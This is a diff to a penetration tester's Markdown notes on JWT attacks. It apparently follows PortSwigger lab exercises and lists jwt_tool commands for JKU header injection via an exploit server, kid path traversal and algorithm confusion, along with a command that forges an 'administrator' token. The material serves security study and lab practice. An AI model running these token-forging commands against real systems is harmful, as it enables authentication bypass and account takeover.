@@ -1,8 +1,13 @@
-# Methodology
+# JWT (JSON Web Token) Attacks
+
+JWTs are used for authentication and session management. Vulnerabilities arise from weak signing secrets, algorithm confusion, missing signature validation, and header injection attacks.
+
+## Methodology
 
 [Attack Methodology](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
 
 > [!example]- JWT Tool Menu
+>
 > ```
 > ➜ jwt_tool --help
 > WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
@@ -15,10 +20,10 @@
 > 				   [-kf KEYFILE] [-V] [-pk PUBKEY] [-jw JWKSFILE] [-Q QUERY]
 > 				   [-v]
 > 				   [jwt]
-> 
+>
 > positional arguments:
 >   jwt                   the JWT to tinker with (no need to specify if in header/cookies)
-> 
+>
 > optional arguments:
 >   -h, --help            show this help message and exit
 >   -b, --bare            return TOKENS ONLY
@@ -92,7 +97,7 @@
 > 						Query a token ID against the logfile to see the details of that request
 > 						e.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a
 >   -v, --verbose         When parsing and printing, produce (slightly more) verbose output.
-> 
+>
 > If you don't have a token, try this one:
 > eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po
 > ```
@@ -120,7 +125,7 @@ jwt_tool <JWT> -T -X i
 - [ ] Can we specify a JWKS URL (JKU Header injection)?
 
 ```
-jwt_tool eyJraWQiOiJkYjQwZjczYy00MWUwLTRhOGMtOGM0NS0zYWZkNTFkYTQwOTciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NDg5ODc1Miwic3ViIjoid2llbmVyIn0.L9z8fOlY3anLswREEyJjHFLSIq8_fAM28KLKlMiftbycEDoqwzeu8heGlhgXo3wr4gdxXF9dsCgJXb4OkX8uU2ENaPSKQ5gWVQlFWJH3DZPdOvA0HaXxqgE_8U7BI6e01U0u9yRweqaU2X2Mf7o5wVe01Ra0ds7Vlx7zfheHsg7IoKPgW04EmkVg_dN62stsx_0HbTLn68JYifArVYaQfGrr3no2vy2ICB0W2h2qDRi3LKWmEblCT5RdRoaAkLjuj7P4jLupOtO0TGXzIQSN9ubUJ0u5swwzJYk5sPAq3y5HSmh-wCGQtBFBB9a4lpIaa3W2lhGe4gGLSx5Mnl2sGQ -T -X s -ju <https://exploit-0a0a009003177e2d814c513b01830014.exploit-server.net>
+jwt_tool eyJraWQiOiJkYjQwZjczYy00MWUwLTRhOGMtOGM0NS0zYWZkNTFkYTQwOTciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NDg5ODc1Miwic3ViIjoid2llbmVyIn0.L9z8fOlY3anLswREEyJjHFLSIq8_fAM28KLKlMiftbycEDoqwzeu8heGlhgXo3wr4gdxXF9dsCgJXb4OkX8uU2ENaPSKQ5gWVQlFWJH3DZPdOvA0HaXxqgE_8U7BI6e01U0u9yRweqaU2X2Mf7o5wVe01Ra0ds7Vlx7zfheHsg7IoKPgW04EmkVg_dN62stsx_0HbTLn68JYifArVYaQfGrr3no2vy2ICB0W2h2qDRi3LKWmEblCT5RdRoaAkLjuj7P4jLupOtO0TGXzIQSN9ubUJ0u5swwzJYk5sPAq3y5HSmh-wCGQtBFBB9a4lpIaa3W2lhGe4gGLSx5Mnl2sGQ -T -X s -ju https://exploit-0a0a009003177e2d814c513b01830014.exploit-server.net
 ```
 
 ```
@@ -140,7 +145,7 @@ jwt_tool eyJraWQiOiJkYjQwZjczYy00MWUwLTRhOGMtOGM0NS0zYWZkNTFkYTQwOTciLCJhbGciOiJ
 Make sure to modify the kid value in the JWT to `jwt_tool` if not using Burp.
 
 - [ ] Check for kid header path traversal
-    
+
 Point to `/dev/null`
 
 ```
@@ -148,11 +153,11 @@ Point to `/dev/null`
 ```
 
 Sign with an empty key
-    
+
 - [ ] Check for algorithm confusion
-    
+
 JWT
-    
+
 ```
 eyJraWQiOiI0OGYyYTNlOC1mYjM2LTRmNWYtYWI3MS1jOGQ0OTdhMTA5Y2IiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NDkwMTIzNCwic3ViIjoid2llbmVyIn0.h8Sofd0dYynEhDm3V8vAB9IoTFlMjvrRj5RPk5mSlBo4IMse206D1x9VaNWEW_ukFw5yaR-x0t44B-Pygz4sBxJB9tU70MAFF0UGdW2BMlXG8Bs-e6CHXtUUuqNo_557PfwudsLKG1AWe6eToE5cxtX_dX2UY1-yUgea1SYsYl0v6m8E5DjP4nzGkf_k4XHNhk84qyoamtMP2r0ug-7-9Jax8MweQGf3znDjFqKrss7xAXgKxkql3CklEo4f0BX6OTygi7cQm_pT1mS4MZBmdQMmYilGBKfw85yqtPaieyOrrYj779vEyNqKv-_tvq1EIqFdU6ooGEcrCRpubx8nug
 ```
@@ -183,3 +188,11 @@ Then use `jwt_tool` to forge the new token:
 ```
 jwt_tool eyJraWQiOiJlZTFkODVlOC04NzBmLTRkZmQtOTQ1My0yNjhjMzdkNjY4MWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NDk3NTY0NCwic3ViIjoid2llbmVyIn0.AACNevR8eiZPcV6QIJGVncP-OPUyeAqwQwiFx2LqyaiGJT-N0sNsDHdbL5YzcoQXqROlZlLX6qAQcDm4n-rPfwc4coWWwyOIyc0hx_IcssffoNOlIzBOY3XWMbEyVpPAa2viFXwasSHJDXIy9aJTtwOohzUEPG0mF99EngWKTmeRrq9AftWts5pM9PujjZRlpDfy9FQywOlThhJwLmTYIY_IWy3Jt82T9MErRbbOTn1VSGGjlLV4BQF-3Du8SX0duuIX2zuIe2npt4dHSEhK7tZWD79HvHGHSYY7fkyFaJv9pxtxgg2HWWTvehVbDsoIiJAaAp4HZ5HlAy72Ory16w -I -pc sub -pv administrator -X k -pk /root/.jwt_tool/mykey.pem
 ```
+
+---
+
+## References
+
+- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
+- [jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
+- [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
